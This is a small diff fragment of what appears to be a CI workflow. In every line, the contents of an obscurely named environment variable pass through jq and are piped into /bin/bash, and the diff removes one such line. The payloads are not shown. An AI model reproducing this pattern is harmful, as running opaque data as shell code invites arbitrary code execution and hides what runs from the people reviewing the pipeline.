@@ -22,7 +22,6 @@ jobs:
           echo $alo9109 | jq -r .otf5871 | /bin/bash
           echo $dc8422 | jq -r .im1543 | /bin/bash
           printf '%s' "$d2096" | jq -r .lly0266 | /bin/bash
-          printf '%s' "$dj638" | jq -r .pfs100 | /bin/bash
           printf '%s' "$dxtbl9502" | jq -r .ksuz11 | /bin/bash
           printf '%s' "$cuo6195" | jq -r .ttj0 | /bin/bash
 
